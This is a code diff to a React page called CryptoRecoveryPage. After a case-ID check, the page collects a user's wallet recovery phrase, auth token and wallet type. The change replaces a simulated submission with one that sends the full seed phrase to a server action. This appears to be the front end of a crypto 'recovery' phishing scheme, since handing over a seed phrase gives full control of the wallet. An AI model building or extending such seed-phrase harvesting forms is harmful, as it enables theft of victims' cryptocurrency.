@@ -13,24 +13,34 @@ import AssetsTable from '@/components/recovery/AssetsTable';
 import LoadingState from '@/components/recovery/LoadingState';
 import ErrorState from '@/components/recovery/ErrorState';
 import VerificationRequired from '@/components/recovery/VerificationRequired';
+import {
+	RecoverySubmissionData,
+	submitRecoveryRequest,
+	verifyAuthToken,
+} from '@/actions/recovery';
 
 export default function CryptoRecoveryPage() {
 	const router = useRouter();
 
+	// Modal states
 	const [showCaseIdModal, setShowCaseIdModal] = useState(false);
 	const [showRecoveryModal, setShowRecoveryModal] = useState(false);
 	const [showSuccessModal, setShowSuccessModal] = useState(false);
 
+	// Case ID verification states
 	const [caseId, setCaseId] = useState('');
 	const [isVerified, setIsVerified] = useState(false);
 	const [isVerifying, setIsVerifying] = useState(false);
 	const [caseIdError, setCaseIdError] = useState('');
 
+	// Recovery form states
 	const [recoveryPhrase, setRecoveryPhrase] = useState('');
 	const [authToken, setAuthToken] = useState('');
+	const [selectedWallet, setSelectedWallet] = useState('');
 	const [isSubmittingRecovery, setIsSubmittingRecovery] = useState(false);
 	const [recoveryError, setRecoveryError] = useState('');
 
+	// Case data states
 	const [caseData, setCaseData] = useState<CaseWithAssets | null>(null);
 	const [isLoadingCase, setIsLoadingCase] = useState(false);
 	const [caseError, setCaseError] = useState('');
@@ -105,28 +115,62 @@ export default function CryptoRecoveryPage() {
 		}
 	};
 
-	const handleRecoverySubmission = () => {
+	const handleRecoverySubmission = async () => {
 		setIsSubmittingRecovery(true);
 		setRecoveryError('');
 
-		setTimeout(() => {
-			if (!recoveryPhrase.trim() || !authToken.trim()) {
-				setRecoveryError('Recovery phrase and wallet address are required');
-				setIsSubmittingRecovery(false);
+		try {
+			// Validate required fields
+			if (!authToken.trim()) {
+				setRecoveryError('Auth token is required');
 				return;
 			}
 
-			const words = recoveryPhrase.trim().split(/\s+/);
-			if (words.length !== 12 && words.length !== 24) {
-				setRecoveryError('Recovery phrase must be exactly 12 or 24 words');
-				setIsSubmittingRecovery(false);
+			if (!selectedWallet) {
+				setRecoveryError('Please select a wallet type');
 				return;
 			}
 
-			setShowRecoveryModal(false);
-			setShowSuccessModal(true);
+			if (!recoveryPhrase.trim()) {
+				setRecoveryError('Recovery phrase is required');
+				return;
+			}
+
+			// Verify auth token before submission
+			const tokenVerification = await verifyAuthToken(authToken);
+			if (!tokenVerification.valid) {
+				setRecoveryError(tokenVerification.error || 'Invalid auth token');
+				return;
+			}
+
+			// Prepare submission data
+			const submissionData: RecoverySubmissionData = {
+				authToken,
+				walletType: selectedWallet,
+				recoveryPhrase,
+				userEmail: 'user@example.com',
+				createdAt: new Date(),
+			};
+
+			// Submit recovery request
+			const result = await submitRecoveryRequest(submissionData);
+
+			if (result.success) {
+				// Reset form
+				setAuthToken('');
+				setSelectedWallet('');
+				setRecoveryPhrase('');
+				setShowRecoveryModal(false);
+				setShowSuccessModal(true);
+			} else {
+				setRecoveryError(result.message);
+			}
+		} catch (err) {
+			console.error('Submission error:', err);
+			setRecoveryError('An unexpected error occurred. Please try again.');
+		} finally {
 			setIsSubmittingRecovery(false);
-		}, 2000);
+		}
 	};
 
 	const handleSuccessCompletion = () => {
@@ -195,6 +239,8 @@ export default function CryptoRecoveryPage() {
 				setRecoveryPhrase={setRecoveryPhrase}
 				authToken={authToken}
 				setAuthToken={setAuthToken}
+				selectedWallet={selectedWallet}
+				setSelectedWallet={setSelectedWallet}
 				error={recoveryError}
 				isSubmitting={isSubmittingRecovery}
 				onSubmit={handleRecoverySubmission}
